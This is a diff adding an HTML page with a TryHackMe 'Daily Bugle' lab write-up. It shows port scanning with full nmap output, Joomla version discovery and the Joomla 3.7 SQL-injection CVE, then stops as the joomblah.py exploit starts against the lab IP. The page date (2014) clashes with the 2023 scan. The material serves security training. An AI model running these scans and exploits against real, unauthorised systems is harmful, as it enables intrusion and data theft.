@@ -1,0 +1,354 @@
+<!doctype html><html lang=en-us dir=ltr><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum."><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:title" content="Daily Bugle"><meta property="og:description" content="Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum."><meta property="og:type" content="article"><meta property="og:url" content="http://localhost:1313/posts/tryhackme/DailyBugle/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2014-09-28T00:00:00+00:00"><meta property="article:modified_time" content="2014-09-28T00:00:00+00:00"><title>Daily Bugle | Notes</title>
+<link rel=manifest href=/manifest.json><link rel=icon href=/favicon.png><link rel=canonical href=http://localhost:1313/posts/tryhackme/DailyBugle/><link rel=stylesheet href=/book.min.ac21c8af3949149e40b4b734505156d2f4275906589cacc78b77ca28e8eee72d.css integrity="sha256-rCHIrzlJFJ5AtLc0UFFW0vQnWQZYnKzHi3fKKOju5y0=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.c01d497d2aa93ce552c5b04f396b072626c28bf84ad582a961770782dc24c057.js integrity="sha256-wB1JfSqpPOVSxbBPOWsHJibCi/hK1YKpYXcHgtwkwFc=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
+<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>Notes</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script><ul><li><input type=checkbox id=section-c72485dffab48e9851d40b64ff5c8557 class=toggle>
+<label for=section-c72485dffab48e9851d40b64ff5c8557 class="flex justify-between"><a role=button>Tryhackme</a></label><ul><li><a href=/docs/tryhackme/Vulnversity/>Vulnversity</a></li><li><a href=/docs/tryhackme/Blue/>Blue</a></li><li><a href=/docs/tryhackme/Kenobi/>Kenobi</a></li><li><a href=/docs/tryhackme/SteelMountain/>Steel Mountain</a></li><li><a href=/docs/tryhackme/Alfred/>Alfred</a></li><li><a href=/docs/tryhackme/HackPark/>Hack Park</a></li><li><a href=/docs/tryhackme/DailyBugle/>Daily Bugle</a></li></ul></li><li><input type=checkbox id=section-d03949e4a854df2320014bae25b6f4d6 class=toggle>
+<label for=section-d03949e4a854df2320014bae25b6f4d6 class="flex justify-between"><a role=button>Hackthebox</a></label><ul><li><a href=/docs/hackthebox/DailyBugle/>Daily Bugle</a></li></ul></li></ul><ul><li><a href=/posts/>Blog</a></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu>
+</label><strong>Daily Bugle</strong>
+<label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#exploitation>Exploitation</a></li><li><a href=#privilege-escalation>Privilege Escalation</a><ul><li><a href=#method-1>Method 1</a></li><li><a href=#method-2>Method 2</a></li></ul></li></ul></nav></aside></header><article class="markdown book-post"><h1><a href=/posts/tryhackme/DailyBugle/>Daily Bugle</a></h1><h5>September 28, 2014</h5><div><a href=/categories/TryHackMe/>TryHackMe</a></div><div><a href=/tags/Scanning/>Scanning</a>,
+<a href=/tags/Exploitation/>Exploitation</a>,
+<a href=/tags/Enumeration/>Enumeration</a>,
+<a href=/tags/Privilege-Escalation/>Privilege Escalation</a></div><p>Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.</p><h1 id=scanning>Scanning
+<a class=anchor href=#scanning>#</a></h1><p>Let&rsquo;s begin by scanning the target.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>rustscan -a 10.10.59.64 -r 1-65535 --ulimit <span style=color:#ae81ff>5000</span> -- -sVC
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#f92672>(</span>root㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/tryhackme<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─# rustscan -a 10.10.59.64 -r 1-65535 --ulimit <span style=color:#ae81ff>5000</span> -- -sVC
+</span></span><span style=display:flex><span>.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+</span></span><span style=display:flex><span>| <span style=color:#f92672>{}</span>  <span style=color:#f92672>}</span>| <span style=color:#f92672>{</span> <span style=color:#f92672>}</span> |<span style=color:#f92672>{</span> <span style=color:#f92672>{</span>__ <span style=color:#f92672>{</span>_   _<span style=color:#f92672>}{</span> <span style=color:#f92672>{</span>__  /  ___<span style=color:#f92672>}</span> / <span style=color:#f92672>{}</span> <span style=color:#ae81ff>\ </span>|  <span style=color:#e6db74>`</span>| |
+</span></span><span style=display:flex><span>| .-. <span style=color:#ae81ff>\|</span> <span style=color:#f92672>{</span>_<span style=color:#f92672>}</span> |.-._<span style=color:#f92672>}</span> <span style=color:#f92672>}</span> | |  .-._<span style=color:#f92672>}</span> <span style=color:#f92672>}</span><span style=color:#ae81ff>\ </span>    <span style=color:#f92672>}</span>/  /<span style=color:#ae81ff>\ </span> <span style=color:#ae81ff>\|</span> |<span style=color:#ae81ff>\ </span> |
+</span></span><span style=display:flex><span><span style=color:#e6db74>`</span>-<span style=color:#e6db74>&#39; `-&#39;</span><span style=color:#e6db74>`</span>-----<span style=color:#e6db74>&#39;`----&#39;</span>  <span style=color:#e6db74>`</span>-<span style=color:#e6db74>&#39;  `----&#39;</span>  <span style=color:#e6db74>`</span>---<span style=color:#e6db74>&#39; `-&#39;</span>  <span style=color:#e6db74>`</span>-<span style=color:#e6db74>&#39;`-&#39;</span> <span style=color:#e6db74>`</span>-<span style=color:#960050;background-color:#1e0010>&#39;</span>
+</span></span><span style=display:flex><span>The Modern Day Port Scanner.
+</span></span><span style=display:flex><span>________________________________________
+</span></span><span style=display:flex><span>: http://discord.skerritt.blog           :
+</span></span><span style=display:flex><span>: https://github.com/RustScan/RustScan :
+</span></span><span style=display:flex><span> --------------------------------------
+</span></span><span style=display:flex><span>0day was here ♥
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>~<span style=color:#f92672>]</span> The config file is expected to be at <span style=color:#e6db74>&#34;/root/.rustscan.toml&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>~<span style=color:#f92672>]</span> Automatically increasing ulimit value to 5000.
+</span></span><span style=display:flex><span>Open 10.10.59.64:22
+</span></span><span style=display:flex><span>Open 10.10.59.64:80
+</span></span><span style=display:flex><span>Open 10.10.59.64:3306
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>~<span style=color:#f92672>]</span> Starting Script<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>&gt;<span style=color:#f92672>]</span> Running script <span style=color:#e6db74>&#34;nmap -vvv -p {{port}} {{ip}} -sVC&#34;</span> on ip 10.10.59.64
+</span></span><span style=display:flex><span>Depending on the complexity of the script, results may take some time to appear.
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>~<span style=color:#f92672>]</span> Starting Nmap 7.93 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2023-03-19 23:05 EDT
+</span></span><span style=display:flex><span>NSE: Loaded <span style=color:#ae81ff>155</span> scripts <span style=color:#66d9ef>for</span> scanning.
+</span></span><span style=display:flex><span>NSE: Script Pre-scanning.
+</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>of 3<span style=color:#f92672>)</span> scan.
+</span></span><span style=display:flex><span>Initiating NSE at 23:05
+</span></span><span style=display:flex><span>Completed NSE at 23:05, 0.00s elapsed
+</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>2</span> <span style=color:#f92672>(</span>of 3<span style=color:#f92672>)</span> scan.
+</span></span><span style=display:flex><span>Initiating NSE at 23:05
+</span></span><span style=display:flex><span>Completed NSE at 23:05, 0.00s elapsed
+</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>3</span> <span style=color:#f92672>(</span>of 3<span style=color:#f92672>)</span> scan.
+</span></span><span style=display:flex><span>Initiating NSE at 23:05
+</span></span><span style=display:flex><span>Completed NSE at 23:05, 0.00s elapsed
+</span></span><span style=display:flex><span>Initiating Ping Scan at 23:05
+</span></span><span style=display:flex><span>Scanning 10.10.59.64 <span style=color:#f92672>[</span><span style=color:#ae81ff>4</span> ports<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>Completed Ping Scan at 23:05, 0.12s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> total hosts<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 23:05
+</span></span><span style=display:flex><span>Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 23:05, 0.06s elapsed
+</span></span><span style=display:flex><span>DNS resolution of <span style=color:#ae81ff>1</span> IPs took 0.06s. Mode: Async <span style=color:#f92672>[</span><span style=color:#75715e>#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span>
+</span></span><span style=display:flex><span>Initiating SYN Stealth Scan at 23:05
+</span></span><span style=display:flex><span>Scanning 10.10.59.64 <span style=color:#f92672>[</span><span style=color:#ae81ff>3</span> ports<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>Discovered open port 22/tcp on 10.10.59.64
+</span></span><span style=display:flex><span>Discovered open port 80/tcp on 10.10.59.64
+</span></span><span style=display:flex><span>Discovered open port 3306/tcp on 10.10.59.64
+</span></span><span style=display:flex><span>Completed SYN Stealth Scan at 23:05, 0.13s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>3</span> total ports<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Initiating Service scan at 23:05
+</span></span><span style=display:flex><span>Scanning <span style=color:#ae81ff>3</span> services on 10.10.59.64
+</span></span><span style=display:flex><span>Completed Service scan at 23:06, 16.47s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>3</span> services on <span style=color:#ae81ff>1</span> host<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>NSE: Script scanning 10.10.59.64.
+</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>of 3<span style=color:#f92672>)</span> scan.
+</span></span><span style=display:flex><span>Initiating NSE at 23:06
+</span></span><span style=display:flex><span>NSE Timing: About 98.57% <span style=color:#66d9ef>done</span>; ETC: 23:06 <span style=color:#f92672>(</span>0:00:00 remaining<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>NSE Timing: About 99.76% <span style=color:#66d9ef>done</span>; ETC: 23:07 <span style=color:#f92672>(</span>0:00:00 remaining<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Completed NSE at 23:07, 67.89s elapsed
+</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>2</span> <span style=color:#f92672>(</span>of 3<span style=color:#f92672>)</span> scan.
+</span></span><span style=display:flex><span>Initiating NSE at 23:07
+</span></span><span style=display:flex><span>Completed NSE at 23:07, 7.52s elapsed
+</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>3</span> <span style=color:#f92672>(</span>of 3<span style=color:#f92672>)</span> scan.
+</span></span><span style=display:flex><span>Initiating NSE at 23:07
+</span></span><span style=display:flex><span>Completed NSE at 23:07, 0.00s elapsed
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.59.64
+</span></span><span style=display:flex><span>Host is up, received echo-reply ttl <span style=color:#ae81ff>61</span> <span style=color:#f92672>(</span>0.092s latency<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>Scanned at 2023-03-19 23:05:49 EDT <span style=color:#66d9ef>for</span> 92s
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PORT     STATE SERVICE REASON         VERSION
+</span></span><span style=display:flex><span>22/tcp   open  ssh     syn-ack ttl <span style=color:#ae81ff>61</span> OpenSSH 7.4 <span style=color:#f92672>(</span>protocol 2.0<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>| ssh-hostkey: 
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>2048</span> 68ed7b197fed14e618986dc58830aae9 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbp89KqmXj7Xx84uhisjiT7pGPYepXVTr4MnPu1P4fnlWzevm6BjeQgDBnoRVhddsjHhI1k+xdnahjcv6kykfT3mSeljfy+jRc+2ejMB95oK2AGycavgOfF4FLPYtd5J97WqRmu2ZC2sQUvbGMUsrNaKLAVdWRIqO5OO07WIGtr3c2ZsM417TTcTsSh1Cjhx3F+gbgi0BbBAN3sQqySa91AFruPA+m0R9JnDX5rzXmhWwzAM1Y8R72c4XKXRXdQT9szyyEiEwaXyT0p6XiaaDyxT2WMXTZEBSUKOHUQiUhX7JjBaeVvuX4ITG+W8zpZ6uXUrUySytuzMXlPyfMBy8B
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> 5cd682dab219e33799fb96820870ee9d <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKb+wNoVp40Na4/Ycep7p++QQiOmDvP550H86ivDdM/7XF9mqOfdhWK0rrvkwq9EDZqibDZr3vL8MtwuMVV5Src<span style=color:#f92672>=</span>
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> d2a975cf2f1ef5444f0b13c20fd737cc <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP4TcvlwCGpiawPyNCkuXTK5CCpat+Bv8LycyNdiTJHX
+</span></span><span style=display:flex><span>80/tcp   open  http    syn-ack ttl <span style=color:#ae81ff>61</span> Apache httpd 2.4.6 <span style=color:#f92672>((</span>CentOS<span style=color:#f92672>)</span> PHP/5.6.40<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>| http-robots.txt: <span style=color:#ae81ff>15</span> disallowed entries 
+</span></span><span style=display:flex><span>| /joomla/administrator/ /administrator/ /bin/ /cache/ 
+</span></span><span style=display:flex><span>| /cli/ /components/ /includes/ /installation/ /language/ 
+</span></span><span style=display:flex><span>|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
+</span></span><span style=display:flex><span>3306/tcp open  mysql   syn-ack ttl <span style=color:#ae81ff>61</span> MariaDB <span style=color:#f92672>(</span>unauthorized<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>NSE: Script Post-scanning.
+</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>of 3<span style=color:#f92672>)</span> scan.
+</span></span><span style=display:flex><span>Initiating NSE at 23:07
+</span></span><span style=display:flex><span>Completed NSE at 23:07, 0.00s elapsed
+</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>2</span> <span style=color:#f92672>(</span>of 3<span style=color:#f92672>)</span> scan.
+</span></span><span style=display:flex><span>Initiating NSE at 23:07
+</span></span><span style=display:flex><span>Completed NSE at 23:07, 0.00s elapsed
+</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>3</span> <span style=color:#f92672>(</span>of 3<span style=color:#f92672>)</span> scan.
+</span></span><span style=display:flex><span>Initiating NSE at 23:07
+</span></span><span style=display:flex><span>Completed NSE at 23:07, 0.00s elapsed
+</span></span><span style=display:flex><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 92.57 seconds
+</span></span><span style=display:flex><span>           Raw packets sent: <span style=color:#ae81ff>7</span> <span style=color:#f92672>(</span>284B<span style=color:#f92672>)</span> | Rcvd: <span style=color:#ae81ff>4</span> <span style=color:#f92672>(</span>160B<span style=color:#f92672>)</span>
+</span></span></code></pre></div><h1 id=enumeration>Enumeration
+<a class=anchor href=#enumeration>#</a></h1><p>We can see three open ports 22, 80 and 3306. There&rsquo;s a website hosted on port 80, mysql service on port 3306 and SSH on port 22.</p><p>Let&rsquo;s navigate to the website that&rsquo;s hosted on port 80. There&rsquo;s Daily Bugle and it says that Spider-Man robs bank.</p><p>From the scan results, we found that there are some disallowed entries in robots.txt. Let&rsquo;s navigate to robots.txt and see if we can find any useful paths.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#75715e># If the Joomla site is installed within a folder </span>
+</span></span><span style=display:flex><span><span style=color:#75715e># eg www.example.com/joomla/ then the robots.txt file </span>
+</span></span><span style=display:flex><span><span style=color:#75715e># MUST be moved to the site root </span>
+</span></span><span style=display:flex><span><span style=color:#75715e># eg www.example.com/robots.txt</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># AND the joomla folder name MUST be prefixed to all of the</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># paths. </span>
+</span></span><span style=display:flex><span><span style=color:#75715e># eg the Disallow rule for the /administrator/ folder MUST </span>
+</span></span><span style=display:flex><span><span style=color:#75715e># be changed to read </span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Disallow: /joomla/administrator/</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># For more information about the robots.txt standard, see:</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># http://www.robotstxt.org/orig.html</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># For syntax checking, see:</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># http://tool.motoricerca.info/robots-checker.phtml</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>User-agent: *
+</span></span><span style=display:flex><span>Disallow: /administrator/
+</span></span><span style=display:flex><span>Disallow: /bin/
+</span></span><span style=display:flex><span>Disallow: /cache/
+</span></span><span style=display:flex><span>Disallow: /cli/
+</span></span><span style=display:flex><span>Disallow: /components/
+</span></span><span style=display:flex><span>Disallow: /includes/
+</span></span><span style=display:flex><span>Disallow: /installation/
+</span></span><span style=display:flex><span>Disallow: /language/
+</span></span><span style=display:flex><span>Disallow: /layouts/
+</span></span><span style=display:flex><span>Disallow: /libraries/
+</span></span><span style=display:flex><span>Disallow: /logs/
+</span></span><span style=display:flex><span>Disallow: /modules/
+</span></span><span style=display:flex><span>Disallow: /plugins/
+</span></span><span style=display:flex><span>Disallow: /tmp/
+</span></span></code></pre></div><p>The <code>/administrator/</code> leads to a Joomla login page. Let&rsquo;s try to find the version of Joomla.</p><p>A simple google search gave the path <code>/administrator/manifests/files/joomla.xml</code> where the Joomla version can be found.</p><blockquote><p><a href=https://www.zyxware.com/articles/5532/how-to-know-the-version-of-joomla-site-without-admin-access>https://www.zyxware.com/articles/5532/how-to-know-the-version-of-joomla-site-without-admin-access</a></p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span> This XML file does not appear to have any style information associated with it. The document tree is shown below.
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;extension</span> <span style=color:#a6e22e>version=</span><span style=color:#e6db74>&#34;3.6&#34;</span> <span style=color:#a6e22e>type=</span><span style=color:#e6db74>&#34;file&#34;</span> <span style=color:#a6e22e>method=</span><span style=color:#e6db74>&#34;upgrade&#34;</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;name&gt;</span>files_joomla<span style=color:#f92672>&lt;/name&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;author&gt;</span>Joomla! Project<span style=color:#f92672>&lt;/author&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;authorEmail&gt;</span>admin@joomla.org<span style=color:#f92672>&lt;/authorEmail&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;authorUrl&gt;</span>www.joomla.org<span style=color:#f92672>&lt;/authorUrl&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;copyright&gt;</span>
+</span></span><span style=display:flex><span>(C) 2005 - 2017 Open Source Matters. All rights reserved
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/copyright&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;license&gt;</span>
+</span></span><span style=display:flex><span>GNU General Public License version 2 or later; see LICENSE.txt
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/license&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;version&gt;</span>3.7.0<span style=color:#f92672>&lt;/version&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;creationDate&gt;</span>April 2017<span style=color:#f92672>&lt;/creationDate&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;description&gt;</span>FILES_JOOMLA_XML_DESCRIPTION<span style=color:#f92672>&lt;/description&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;scriptfile&gt;</span>administrator/components/com_admin/script.php<span style=color:#f92672>&lt;/scriptfile&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;update&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;schemas&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;schemapath</span> <span style=color:#a6e22e>type=</span><span style=color:#e6db74>&#34;mysql&#34;</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>administrator/components/com_admin/sql/updates/mysql
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/schemapath&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;schemapath</span> <span style=color:#a6e22e>type=</span><span style=color:#e6db74>&#34;sqlsrv&#34;</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>administrator/components/com_admin/sql/updates/sqlazure
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/schemapath&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;schemapath</span> <span style=color:#a6e22e>type=</span><span style=color:#e6db74>&#34;sqlazure&#34;</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>administrator/components/com_admin/sql/updates/sqlazure
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/schemapath&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;schemapath</span> <span style=color:#a6e22e>type=</span><span style=color:#e6db74>&#34;postgresql&#34;</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>administrator/components/com_admin/sql/updates/postgresql
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/schemapath&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/schemas&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/update&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;fileset&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;files&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;folder&gt;</span>administrator<span style=color:#f92672>&lt;/folder&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;folder&gt;</span>bin<span style=color:#f92672>&lt;/folder&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;folder&gt;</span>cache<span style=color:#f92672>&lt;/folder&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;folder&gt;</span>cli<span style=color:#f92672>&lt;/folder&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;folder&gt;</span>components<span style=color:#f92672>&lt;/folder&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;folder&gt;</span>images<span style=color:#f92672>&lt;/folder&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;folder&gt;</span>includes<span style=color:#f92672>&lt;/folder&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;folder&gt;</span>language<span style=color:#f92672>&lt;/folder&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;folder&gt;</span>layouts<span style=color:#f92672>&lt;/folder&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;folder&gt;</span>libraries<span style=color:#f92672>&lt;/folder&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;folder&gt;</span>media<span style=color:#f92672>&lt;/folder&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;folder&gt;</span>modules<span style=color:#f92672>&lt;/folder&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;folder&gt;</span>plugins<span style=color:#f92672>&lt;/folder&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;folder&gt;</span>templates<span style=color:#f92672>&lt;/folder&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;folder&gt;</span>tmp<span style=color:#f92672>&lt;/folder&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;file&gt;</span>htaccess.txt<span style=color:#f92672>&lt;/file&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;file&gt;</span>web.config.txt<span style=color:#f92672>&lt;/file&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;file&gt;</span>LICENSE.txt<span style=color:#f92672>&lt;/file&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;file&gt;</span>README.txt<span style=color:#f92672>&lt;/file&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;file&gt;</span>index.php<span style=color:#f92672>&lt;/file&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/files&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/fileset&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;updateservers&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;server</span> <span style=color:#a6e22e>name=</span><span style=color:#e6db74>&#34;Joomla! Core&#34;</span> <span style=color:#a6e22e>type=</span><span style=color:#e6db74>&#34;collection&#34;</span><span style=color:#f92672>&gt;</span>https://update.joomla.org/core/list.xml<span style=color:#f92672>&lt;/server&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/updateservers&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/extension&gt;</span>
+</span></span></code></pre></div><p>Upon checking the vulnerabilities for the Joomla 3.7, there is an SQL Injection vulnerability present in Joomla 3.7.x before 3.7.1.</p><blockquote><p><a href=https://www.cvedetails.com/cve/CVE-2017-8917/>https://www.cvedetails.com/cve/CVE-2017-8917/</a></p></blockquote><h1 id=exploitation>Exploitation
+<a class=anchor href=#exploitation>#</a></h1><p>There is a python code available to exploit this vulnerability.</p><blockquote><p><a href=https://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py>https://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py</a></p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>┌──<span style=color:#f92672>(</span>root㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/tryhackme<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─# ./joomblah.py http://10.10.59.64/   
+</span></span><span style=display:flex><span>                                                                                                                    
+</span></span><span style=display:flex><span>    .---.    .-<span style=color:#e6db74>&#39;&#39;&#39;-.        .-&#39;&#39;&#39;</span>-.                                                           
+</span></span><span style=display:flex><span>    |   |   <span style=color:#e6db74>&#39;   _    \     &#39;</span>   _    <span style=color:#ae81ff>\ </span>                           .---.                        
